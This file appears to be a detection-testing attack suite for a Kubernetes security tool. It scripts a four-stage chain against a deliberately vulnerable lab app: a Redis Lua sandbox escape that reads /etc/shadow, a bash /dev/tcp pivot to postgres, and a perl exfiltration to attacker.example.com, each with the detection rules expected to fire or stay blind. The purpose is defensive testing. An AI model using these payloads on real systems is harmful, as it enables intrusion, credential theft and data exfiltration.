@@ -1,0 +1,152 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: chain-e2e-redis-pivot
+  description: |
+    ONE end-to-end attack chain across 4 pods. The story:
+
+      Normal traffic: user → chain-frontend → chain-backend → {redis, postgres}.
+      chain-frontend also exposes /api/cache/eval — a LEGITIMATE feature that
+      proxies user-supplied Lua scripts to redis EVAL for atomic operations
+      (rate-limiting, sliding-window counters, etc.). This is a real pattern
+      in production apps; the vuln is that the script content is untrusted.
+
+      Stage 1 (recon, blind by design): attacker discovers /api/cache/eval
+        works by submitting a benign Lua. No detection — the endpoint is
+        a feature, the traffic is legitimate, nothing fires.
+
+      Stage 2 (exploit redis fileless): attacker submits malicious Lua that
+        escapes the redis Lua sandbox via package.loadlib() + io.popen(),
+        and uses the escape to read /etc/shadow inside the redis pod.
+
+      Stage 3 (redis as postgres client): same escape vector, but the
+        popen'd command opens raw TCP to chain-postgres:5432 from inside
+        the redis pod — the "redis as a pg client" pivot.
+
+      Stage 4 (exfil outside cluster): same escape, popen'd command
+        resolves attacker.example.com and connects out to it carrying
+        whatever was extracted earlier.
+
+    Detection narrative (under shipped cluster defaults):
+      Stage 1: nothing should fire (legitimate-looking)
+      Stage 2: R0001 (new comm), R0010 (sensitive file) fire reliably
+      Stage 3: R0001 fires (new comm); the redis→postgres egress is
+               NetworkNeighborhood-novel but R0011 is monitor-only
+      Stage 4: R0001 fires (new comm); the DNS lookup + external egress
+               are BLIND today (networkEventsStreaming=disable)
+
+    See example/chain/sbobs/ for the actual learned ApplicationProfiles
+    and NetworkNeighborhoods that bound which alerts can fire.
+
+target:
+  service: chain-frontend
+  namespace: chain
+  port: 8080
+  protocol: http
+
+attacks:
+  # ─── Stage 1 ─── Recon (legitimate-looking, blind by design) ────────
+  - name: s1-recon-benign-eval
+    type: ssrf
+    http:
+      method: POST
+      path: /api/cache/eval
+      headers:
+        Content-Type: application/json
+      # A genuinely legitimate atomic-counter Lua — exactly what the
+      # endpoint is FOR. Returns the counter's new value.
+      body: '{"script":"local k=KEYS[1] or \"chain:counter\"; return redis.call(\"INCR\", k)","keys":["chain:counter"]}'
+    successIndicators:
+      - statusCode: 200
+    expectedDetections: []   # blind by design — this IS the recon vector
+
+  # ─── Stage 2 ─── Exploit (sandbox escape + sensitive-file read) ─────
+  # Lua: load liblua's io module via package.loadlib (escaping the redis
+  # sandbox), then io.popen("cat /etc/shadow"). /etc/shadow is in R0010's
+  # hardcoded sensitive-paths list → R0010 fires on redis pod. cat is NOT
+  # in redis's learned profile (only redis-server + sh ever ran during
+  # benign traffic) → R0001 fires too.
+  - name: s2-escape-sandbox-read-shadow
+    type: fileless
+    http:
+      method: POST
+      path: /api/cache/eval
+      headers:
+        Content-Type: application/json
+      body: |
+        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen('cat /etc/shadow 2>/dev/null | head -c 200; echo'); local out=h:read('*a'); h:close(); return out"}
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+      - ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: redis
+
+  # ─── Stage 3 ─── Pivot (redis pod speaks pg-wire to postgres) ────────
+  # Same sandbox escape, but popen("bash -c '<dev/tcp>'") inside the
+  # redis pod. /bin/sh is dash (no /dev/tcp), so we explicitly invoke
+  # bash. The redirection opens a raw TCP socket to chain-postgres:5432,
+  # then `head -c 30 <&3` reads back postgres's first response bytes
+  # (a 'E' error frame because the bytes we send aren't a valid startup
+  # packet) and base64-encodes them so we can prove the connection
+  # round-tripped. THIS is "redis as a postgres client" — the redis
+  # container actively talks pg-wire to postgres.
+  # bash is NOT in redis's learned profile → R0001 fires.
+  # The egress redis→postgres is NetworkNeighborhood-novel but R0011 is
+  # isTriggerAlert=false → BLIND today.
+  - name: s3-pivot-redis-as-pg-client
+    type: lateral
+    http:
+      method: POST
+      path: /api/cache/eval
+      headers:
+        Content-Type: application/json
+      body: |
+        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"bash -c 'exec 3<>/dev/tcp/chain-postgres/5432; printf %b \\\\x00\\\\x00\\\\x00\\\\x08\\\\x04\\\\xd2\\\\x16\\\\x2f >&3; head -c 30 <&3 | base64' 2>&1; echo done\"); local out=h:read('*a'); h:close(); return out"}
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: bash
+      - ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: redis
+        # BLIND today: networkEventsStreaming=disable + R0011 monitor-only.
+
+  # ─── Stage 4 ─── Exfil (data leaves the cluster via perl) ────────────
+  # Same escape, popen perl with IO::Socket::INET to open TCP to an
+  # external host. perl is NOT in redis's profile → R0001 fires.
+  # The DNS lookup of attacker.example.com would fire R0005 and the TCP
+  # egress would fire R0011 — both BLIND today. (perl is preferred over
+  # wget/curl because the redis-vulnerable image ships perl but not
+  # wget/curl/nc — see example/chain/sbobs/ap-chain-redis.yaml.)
+  - name: s4-exfil-to-internet
+    type: exfil
+    http:
+      method: POST
+      path: /api/cache/eval
+      headers:
+        Content-Type: application/json
+      body: |
+        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"perl -e 'use IO::Socket::INET; my $s=IO::Socket::INET->new(PeerAddr=>q{attacker.example.com:80},Timeout=>2); print $s qq{GET /?d=loot HTTP/1.0\\\\nHost:x\\\\n\\\\n} if $s; close $s if $s; print qq{done}' 2>&1\"); local out=h:read('*a'); h:close(); return out"}
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: perl
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: redis
+        # BLIND today: networkEventsStreaming=disable.
+      - ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: redis
+        # BLIND today: networkEventsStreaming=disable + R0011 monitor-only.
